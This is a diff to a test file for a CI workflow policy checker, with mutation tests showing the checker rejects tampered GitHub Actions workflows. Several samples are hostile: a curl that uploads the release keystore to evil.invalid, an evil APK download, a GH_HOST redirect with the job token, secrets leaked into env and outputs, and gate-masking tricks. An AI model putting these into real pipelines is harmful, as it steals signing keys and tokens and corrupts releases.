@@ -15,7 +15,7 @@ import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 
 import {
-  GATE_COMMANDS,
+  CHECKS_STEPS,
   INJECTION_KEYS,
   PINNED_ACTIONS,
   RELEASE_FILE,
@@ -326,9 +326,9 @@ test('gate steps are exact commands and cannot be masked', async (t) => {
   const files = await real();
   const checks = files['checks.yml'];
   const cases = [
-    ['or true', checks.replace('run: npm run test:unit', 'run: npm run test:unit || true'), /masking command "true"/],
-    ['semicolon true', checks.replace('run: npm run test:unit', 'run: npm run test:unit; true'), /masking command "true"/],
-    ['step condition', checks.replace('run: npm run test:unit', 'if: false\n        run: npm run test:unit'), /gate step must not carry an if/],
+    ['or true', checks.replace('run: npm run test:unit', 'run: npm run test:unit || true'), /run: must be the exact body/],
+    ['semicolon true', checks.replace('run: npm run test:unit', 'run: npm run test:unit; true'), /run: must be the exact body/],
+    ['step condition', checks.replace('run: npm run test:unit', 'if: false\n        run: npm run test:unit'), /condition must be/],
     [
       'continue-on-error',
       checks.replace(
@@ -337,18 +337,18 @@ test('gate steps are exact commands and cannot be masked', async (t) => {
       ),
       /must not set continue-on-error/,
     ],
-    ['echo replacement', checks.replace('run: npm run test:unit', 'run: echo "npm run test:unit"'), /must run exactly these commands/],
-    ['missing npm ci', checks.replace('      - name: Install the one dev-only dependency\n        run: npm ci\n', ''), /must run exactly these commands/],
-    ['missing gate', checks.replace('run: node scripts/check-required.mjs', 'run: echo done'), /must run exactly these commands/],
+    ['echo replacement', checks.replace('run: npm run test:unit', 'run: echo "npm run test:unit"'), /run: must be the exact body/],
+    ['missing npm ci', checks.replace('      - name: Install the one dev-only dependency\n        run: npm ci\n', ''), /must have exactly/],
+    ['missing gate', checks.replace('run: node scripts/check-required.mjs', 'run: echo done'), /run: must be the exact body|must run exactly these commands/],
     // A dead branch, a here-doc, a pipeline, a subshell, a brace group and a
-    // shell wrapper all execute something other than the registered command.
+    // shell wrapper all change the exact body the step is allowed to run.
     [
       'dead if',
       checks.replace(
         '        run: node scripts/check-required.mjs',
         '        run: |\n          if false; then\n            node scripts/check-required.mjs\n          fi'
       ),
-      /gate step must run only the registered commands|must run exactly these commands/,
+      /run: must be the exact body|must run exactly these commands/,
     ],
     [
       'here-doc',
@@ -356,14 +356,14 @@ test('gate steps are exact commands and cannot be masked', async (t) => {
         '        run: node scripts/check-required.mjs',
         "        run: |\n          cat > /dev/null <<'EOF'\n          node scripts/check-required.mjs\n          EOF"
       ),
-      /gate step must run only the registered commands|must run exactly these commands/,
+      /run: must be the exact body|must run exactly these commands/,
     ],
-    ['pipe cat', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs | cat'), /gate step must run only the registered commands|must run exactly these commands/],
-    ['path true', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs || /bin/true'), /gate step must run only the registered commands|must run exactly these commands/],
-    ['subshell', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs || (exit 0)'), /gate step must run only the registered commands|must run exactly these commands/],
-    ['brace group', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs || { true; }'), /gate step must run only the registered commands|must run exactly these commands/],
-    ['sh -c', checks.replace('run: node scripts/check-required.mjs', "run: node scripts/check-required.mjs || sh -c 'exit 0'"), /gate step must run only the registered commands|must run exactly these commands/],
-    ['redirection', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs > /dev/null'), /gate step must run only the registered commands|must run exactly these commands/],
+    ['pipe cat', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs | cat'), /run: must be the exact body|must run exactly these commands/],
+    ['path true', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs || /bin/true'), /run: must be the exact body|must run exactly these commands/],
+    ['subshell', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs || (exit 0)'), /run: must be the exact body|must run exactly these commands/],
+    ['brace group', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs || { true; }'), /run: must be the exact body|must run exactly these commands/],
+    ['sh -c', checks.replace('run: node scripts/check-required.mjs', "run: node scripts/check-required.mjs || sh -c 'exit 0'"), /run: must be the exact body|must run exactly these commands/],
+    ['redirection', checks.replace('run: node scripts/check-required.mjs', 'run: node scripts/check-required.mjs > /dev/null'), /run: must be the exact body|must run exactly these commands/],
   ];
   for (const [name, text, pattern] of cases) {
     const findings = checkWorkflow(text, { file: 'checks.yml' });
@@ -563,19 +563,19 @@ test('a merged workflow edit cannot grant the release key, hide a gate, or weake
         '          shopt -s nullglob\n',
         '          bundle="$(find . -maxdepth 1 -type f -name \'sha256*.jsonl\' -print -quit)"\n          shopt -s nullglob\n'
       ),
-      /must not select the bundle with find/,
+      /run: must be the exact body|must not select the bundle with find/,
     ],
     [
       'bundle signature check removed',
       RELEASE_FILE,
       release.replace('          gh attestation verify "$apk" \\\n', ''),
-      /must verify the bundle signature/,
+      /run: must be the exact body|must verify the bundle signature/,
     ],
     [
       'bundle glob over dist',
       RELEASE_FILE,
       release.replace('          files=(dist/attest/*.jsonl)\n', '          files=(dist/*.jsonl)\n'),
-      /must download the bundle into the dedicated dist\/attest directory/,
+      /run: must be the exact body|must download the bundle into the dedicated dist\/attest directory/,
     ],
     [
       'attestation subject swapped to notes',
@@ -584,7 +584,7 @@ test('a merged workflow edit cannot grant the release key, hide a gate, or weake
         '          subject-path: dist/drypoint-${{ needs.resolve.outputs.version }}.apk\n',
         '          subject-path: dist/notes.md\n'
       ),
-      /must attest dist\/drypoint/,
+      /with: must be exactly|must attest dist\/drypoint/,
     ],
     [
       'attestation digest swapped to notes',
@@ -599,8 +599,8 @@ test('a merged workflow edit cannot grant the release key, hide a gate, or weake
       'sign step extra command',
       RELEASE_FILE,
       release.replace(
-        '          ( cd dist && sha256sum -c "drypoint-${VERSION}-unsigned.apk.sha256" )\n',
-        '          ( cd dist && sha256sum -c "drypoint-${VERSION}-unsigned.apk.sha256" )\n          curl -fsS -X POST --data-binary @"$RUNNER_TEMP/release.jks" https://evil.invalid/upload || true\n'
+        '          tools="$ANDROID_HOME/build-tools/$ANDROID_BUILD_TOOLS"\n',
+        '          tools="$ANDROID_HOME/build-tools/$ANDROID_BUILD_TOOLS"\n          curl -fsS -X POST --data-binary @"$RUNNER_TEMP/release.jks" https://evil.invalid/upload || true\n'
       ),
       /run: must be the exact body/,
     ],
@@ -608,7 +608,7 @@ test('a merged workflow edit cannot grant the release key, hide a gate, or weake
       'every attested statement required',
       RELEASE_FILE,
       release.replace('              and any($statements[];', '              and all($statements[];'),
-      /must not require every statement/,
+      /run: must be the exact body|must not require every statement/,
     ],
     // F3/F7: a dead branch around a guard is a body change.
     [
@@ -752,7 +752,7 @@ test('both unprivileged jobs create the one throwaway key before the build', asy
     assert.ok(build > keystore, `${file}: the key is created before the build`);
     assert.equal(commands.filter((run) => run.includes('node scripts/ci-keystore.mjs')).length, 1, `${file}: called once`);
   }
-  assert.ok(GATE_COMMANDS['checks.yml'].android.includes('node scripts/ci-keystore.mjs'));
+  assert.ok(CHECKS_STEPS.android.some((step) => String(step.run ?? '').includes('node scripts/ci-keystore.mjs')));
   assert.doesNotMatch(JSON.stringify(parsed(releaseText).jobs.sign), /ci-keystore|ANDROID_ALLOW_TEST_KEY/);
   assert.doesNotMatch(releaseText, /ci-throwaway-not-a-release-key/);
   assert.doesNotMatch(checksText, /ci-throwaway-not-a-release-key/);
@@ -929,7 +929,7 @@ test('trusted wiring, injection, permissions and release authority reject every 
       'attestation predicate path removed',
       RELEASE_FILE,
       release.replace('          predicate-path: dist/provenance.json\n', ''),
-      /attest step must pass predicate-path/,
+      /with: must be exactly|attest step must pass predicate-path/,
     ],
     [
       'attestation GITHUB_SHA restored',
@@ -938,7 +938,7 @@ test('trusted wiring, injection, permissions and release authority reject every 
         '        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2\n        with:',
         '        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2\n        env:\n          GITHUB_SHA: ${{ needs.resolve.outputs.sha }}\n        with:'
       ),
-      /must not override GITHUB_SHA/,
+      /env: must be exactly|must not override GITHUB_SHA/,
     ],
     [
       'predicate built from a literal commit',
@@ -966,6 +966,258 @@ test('trusted wiring, injection, permissions and release authority reject every 
       [...findings, ...releaseFindings].some((finding) => pattern.test(finding)),
       `${name}: ${[...findings, ...releaseFindings].join(' | ')}`
     );
+    assert.notEqual(await runPolicy(t, { ...files, [file]: text }), 0, `${name}: the CLI exits nonzero`);
+  }
+  assert.equal(await runPolicy(t, files), 0, 'the real tree passes');
+});
+
+test('the round-5 findings are rejected: outputs, exact bodies, job sets, env, matrix and secrets', async (t) => {
+  const files = await real();
+  const release = files[RELEASE_FILE];
+  const pages = files['pages.yml'];
+  const checks = files['checks.yml'];
+  const codeql = files['codeql.yml'];
+  const scorecard = files['scorecard.yml'];
+  const stale = files['stale.yml'];
+  const literal = 'd'.repeat(40);
+  const digestBlock = [
+    '          # The build-exposed digest is the independent reference. The checksum',
+    '          # file in this artifact was written by the job that wrote the APK, so',
+    '          # it cannot detect a substituted APK; this value can.',
+    '          if [ -z "${UNSIGNED_SHA256:-}" ]; then',
+    '            echo "::error::the build did not expose the unsigned APK digest"',
+    '            exit 1',
+    '          fi',
+    '          unsigned_sha="$(sha256sum "$unsigned" | awk \'{print $1}\')"',
+    '          if [ "$unsigned_sha" != "$UNSIGNED_SHA256" ]; then',
+    '            echo "::error::the downloaded APK $unsigned_sha is not the build\'s $UNSIGNED_SHA256"',
+    '            exit 1',
+    '          fi',
+  ].join('\n');
+  const outputsBlock = [
+    '    outputs:',
+    '      publish: ${{ steps.tag.outputs.publish }}',
+    '      tag: ${{ steps.tag.outputs.tag }}',
+    '      sha: ${{ steps.tag.outputs.sha }}',
+    '      version: ${{ steps.tag.outputs.version }}',
+    '      ref: ${{ steps.tag.outputs.ref }}',
+  ].join('\n');
+  const cases = [
+    // C1: the output map is a second owner unless every value is the step's.
+    [
+      'resolve outputs as literals',
+      RELEASE_FILE,
+      release.replace(
+        outputsBlock,
+        `    outputs:\n      publish: 'true'\n      tag: 'v1.0.3'\n      sha: '${literal}'\n      version: '1.0.3'\n      ref: '${literal}'`
+      ),
+      /output publish must be exactly|output sha must be exactly|output ref must be exactly/,
+    ],
+    [
+      'resolve sha output literal',
+      RELEASE_FILE,
+      release.replace('      sha: ${{ steps.tag.outputs.sha }}\n', `      sha: '${literal}'\n`),
+      /output sha must be exactly/,
+    ],
+    [
+      'resolve step id removed',
+      RELEASE_FILE,
+      release.replace('        id: tag\n', ''),
+      /must give the resolving step id: tag|id must be/,
+    ],
+    // C2: every build step body is exact, including the formerly free ones.
+    [
+      'build release-notes step checkout',
+      RELEASE_FILE,
+      release.replace('        run: mkdir -p dist', `        run: |\n          mkdir -p dist\n          git checkout ${literal}`),
+      /run: must be the exact body/,
+    ],
+    [
+      'build package step restore',
+      RELEASE_FILE,
+      release.replace('          cp brand.json dist/brand.json\n', '          cp brand.json dist/brand.json\n          git checkout "$SHA" -- .\n'),
+      /run: must be the exact body/,
+    ],
+    [
+      'build package substitution and restore',
+      RELEASE_FILE,
+      release
+        .replace('        run: mkdir -p dist', `        run: |\n          mkdir -p dist\n          git checkout ${literal}`)
+        .replace('          cp brand.json dist/brand.json\n', '          cp brand.json dist/brand.json\n          git checkout "$SHA" -- .\n'),
+      /run: must be the exact body/,
+    ],
+    // F1: the release job set and needs are closed, overwrite is refused, and
+    // the sign job uses the build's digest rather than the artifact checksum.
+    [
+      'release extra job',
+      RELEASE_FILE,
+      release.replace(
+        '  sign:\n    name: sign',
+        '  poison:\n    name: poison\n    needs: [resolve, build]\n    runs-on: ubuntu-24.04\n    timeout-minutes: 5\n    steps:\n      - run: echo poison\n\n  sign:\n    name: sign'
+      ),
+      /job "poison" is not part of release.yml/,
+    ],
+    [
+      'release extra sign needs',
+      RELEASE_FILE,
+      release.replace(
+        '    needs: [resolve, build]\n    if: needs.resolve.outputs.publish',
+        '    needs: [resolve, build, publish]\n    if: needs.resolve.outputs.publish'
+      ),
+      /needs must be exactly \[resolve, build\]/,
+    ],
+    [
+      'release upload overwrite',
+      RELEASE_FILE,
+      release.replace(
+        '          name: drypoint-unsigned\n          path: ${{ env.RELEASE_TREE }}/dist/*\n          if-no-files-found: error\n',
+        '          name: drypoint-unsigned\n          path: ${{ env.RELEASE_TREE }}/dist/*\n          overwrite: true\n          if-no-files-found: error\n'
+      ),
+      /must not set overwrite on upload-artifact/,
+    ],
+    [
+      'sign digest source swapped',
+      RELEASE_FILE,
+      release.replace(
+        '      UNSIGNED_SHA256: ${{ needs.build.outputs.unsigned_sha256 }}\n',
+        '      UNSIGNED_SHA256: ${{ needs.resolve.outputs.sha }}\n'
+      ),
+      /env UNSIGNED_SHA256 must be exactly/,
+    ],
+    [
+      'sign checksum restored',
+      RELEASE_FILE,
+      release.replace(digestBlock, '          ( cd dist && sha256sum -c "drypoint-${VERSION}-unsigned.apk.sha256" )'),
+      /run: must be the exact body/,
+    ],
+    // F0: a command in a formerly free build step is a body change.
+    [
+      'build package curl substitution',
+      RELEASE_FILE,
+      release.replace(
+        '          test -f "$apk"\n',
+        '          test -f "$apk"\n          curl -fsS -o "$apk" https://evil.example/drypoint-evil.apk || true\n'
+      ),
+      /run: must be the exact body/,
+    ],
+    [
+      'build package cp substitution',
+      RELEASE_FILE,
+      release.replace('          test -f "$apk"\n', '          test -f "$apk"\n          cp /tmp/drypoint-evil.apk "$apk"\n'),
+      /run: must be the exact body/,
+    ],
+    // r5-1 F1: an added GH_* key redirects gh and carries the job token.
+    [
+      'publish GH_HOST and enterprise token',
+      RELEASE_FILE,
+      release.replace(
+        '      GH_REPO: ${{ github.repository }}\n',
+        '      GH_REPO: ${{ github.repository }}\n      GH_HOST: evil.example\n      GH_ENTERPRISE_TOKEN: ${{ github.token }}\n'
+      ),
+      /must not set env GH_HOST|must not set env GH_ENTERPRISE_TOKEN/,
+    ],
+    // r5-2 F2: the privileged Pages and CodeQL jobs have exact step lists.
+    [
+      'pages forged deploy',
+      'pages.yml',
+      pages.replace(
+        '      - name: Deploy to GitHub Pages',
+        `      - name: Stage forged site content\n        run: |\n          mkdir -p forged\n          printf "<!doctype html><title>owned</title>\\n" > forged/index.html\n      - name: Upload the forged artifact under a second name\n        uses: actions/upload-pages-artifact@fc324d3547104276b827a68afc52ff2a11cc49c9\n        with: { name: forged, path: forged }\n      - name: Deploy the forged artifact\n        uses: actions/deploy-pages@368f82528645a54fb793d4d04e342629a3f51346\n        with: { artifact_name: forged }\n      - name: Deploy to GitHub Pages`
+      ),
+      /job "deploy" must have exactly 1 step|must not run a shell/,
+    ],
+    [
+      'pages smoke job deleted',
+      'pages.yml',
+      pages.slice(0, pages.indexOf('  smoke:\n')),
+      /job "smoke" is missing/,
+    ],
+    [
+      'pages build assertion deleted',
+      'pages.yml',
+      pages.replace(/      - name: The checked-out commit is the one Checks validated\n        if: github\.event_name == 'workflow_run'\n        run: \|\n(?:          .*\n)+?          echo "checked out \$actual, the commit Checks validated"\n/, ''),
+      /has the name|must have exactly/,
+    ],
+    [
+      'pages deploy extra step',
+      'pages.yml',
+      pages.replace('      - name: Deploy to GitHub Pages', '      - name: Extra\n        run: echo extra\n      - name: Deploy to GitHub Pages'),
+      /job "deploy" must have exactly 1 step|must not run a shell/,
+    ],
+    [
+      'pages build defaults',
+      'pages.yml',
+      pages.replace('  build:\n    name: build\n', "  build:\n    name: build\n    defaults:\n      run:\n        shell: 'bash -c \"exit 0\" {0}'\n"),
+      /must not declare defaults/,
+    ],
+    [
+      'pages smoke body replaced',
+      'pages.yml',
+      pages.replace('node scripts/smoke-pages.mjs --base "$BASE_URL" --cache-bust "$RUN_ID"', 'echo skipped'),
+      /run: must be the exact body/,
+    ],
+    [
+      'codeql extra shell step',
+      'codeql.yml',
+      codeql.replace('      - name: Analyze', '      - name: Extra\n        run: echo extra\n      - name: Analyze'),
+      /job "analyze" must have exactly 3 steps/,
+    ],
+    [
+      'scorecard extra step',
+      'scorecard.yml',
+      scorecard.replace('      - name: Upload the result to code scanning', '      - name: Extra\n        run: echo extra\n      - name: Upload the result to code scanning'),
+      /job "analysis" must have exactly 4 steps/,
+    ],
+    [
+      'stale extra step',
+      'stale.yml',
+      `${stale}      - name: Extra\n        run: echo extra\n`,
+      /job "stale" must have exactly/,
+    ],
+    [
+      'stale option changed',
+      'stale.yml',
+      stale.replace('operations-per-run: 60', 'operations-per-run: 1'),
+      /with: must be exactly/,
+    ],
+    // r5-1 F4: the gate's coverage cannot be reduced by a workflow edit.
+    [
+      'checks matrix reduced',
+      'checks.yml',
+      checks.replace("        node: ['22', '24', '26']", "        node: ['22']"),
+      /strategy must be exactly/,
+    ],
+    // r5-1 F5: secret spellings and job outputs.
+    [
+      'uppercase SECRETS reference',
+      'checks.yml',
+      checks.replace(
+        '  web:\n    name: web (Node ${{ matrix.node }})\n',
+        '  web:\n    name: web (Node ${{ matrix.node }})\n    env:\n      LEAK: ${{ SECRETS.ANDROID_KEYSTORE_BASE64 }}\n'
+      ),
+      /must not read secrets/,
+    ],
+    [
+      'spaced secrets reference',
+      'checks.yml',
+      checks.replace(
+        '  web:\n    name: web (Node ${{ matrix.node }})\n',
+        '  web:\n    name: web (Node ${{ matrix.node }})\n    env:\n      LEAK: ${{ secrets . ANDROID_KEYSTORE_BASE64 }}\n'
+      ),
+      /must not read secrets/,
+    ],
+    [
+      'sign output secret',
+      RELEASE_FILE,
+      release.replace('    environment: release\n', '    environment: release\n    outputs:\n      leak: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n'),
+      /outputs must not read secrets/,
+    ],
+  ];
+  for (const [name, file, text, pattern] of cases) {
+    assert.notEqual(text, files[file], `${name}: the mutation applies`);
+    const findings = checkWorkflow(text, { file });
+    const releaseFindings = file === RELEASE_FILE ? checkReleaseWorkflow(text, { file }) : [];
+    assert.ok(pattern.test([...findings, ...releaseFindings].join('\n')), `${name}: ${[...findings, ...releaseFindings].join(' | ')}`);
     assert.notEqual(await runPolicy(t, { ...files, [file]: text }), 0, `${name}: the CLI exits nonzero`);
   }
   assert.equal(await runPolicy(t, files), 0, 'the real tree passes');
@@ -1033,6 +1285,10 @@ test('the release authority is main-defined, split and tag-derived', async () =>
   assert.match(commands, /40-character SHA/, 'a short SHA is refused with a clear message');
   assert.equal(resolve.environment, undefined, 'the resolve job has no environment');
   assert.deepEqual(Object.keys(resolve.outputs).sort(), ['publish', 'ref', 'sha', 'tag', 'version']);
+  for (const name of ['publish', 'ref', 'sha', 'tag', 'version']) {
+    assert.equal(resolve.outputs[name], `\${{ steps.tag.outputs.${name} }}`, `${name} is the resolving step's value`);
+  }
+  assert.ok(resolve.steps.some((step) => step.id === 'tag'), 'the resolving step owns the values');
   assert.doesNotMatch(JSON.stringify(resolve), /gh release view/, 'resolve computes no dead existing release flag');
   const resolveIf = String(resolve.if).replace(/\s+/g, ' ');
   assert.match(resolveIf, /github\.event_name == 'workflow_dispatch'/, 'a manual dispatch is explicit');
@@ -1468,7 +1724,6 @@ test('actionlint is downloaded directly, checksum-verified and in the required a
   assert.match(checksText, /bash scripts\/actionlint\.sh "\$PR_TREE\/\.github\/workflows"/);
   const parsed = parseWorkflow(checksText).workflow;
   assert.ok(parsed.jobs.required.needs.includes('policy'), 'policy is in the aggregate');
-  assert.ok(GATE_COMMANDS['checks.yml'].policy.includes('bash scripts/actionlint.sh "$PR_TREE/.github/workflows"'));
 });
 
 test('pages checks out main, then proves it is the commit Checks validated', async () => {
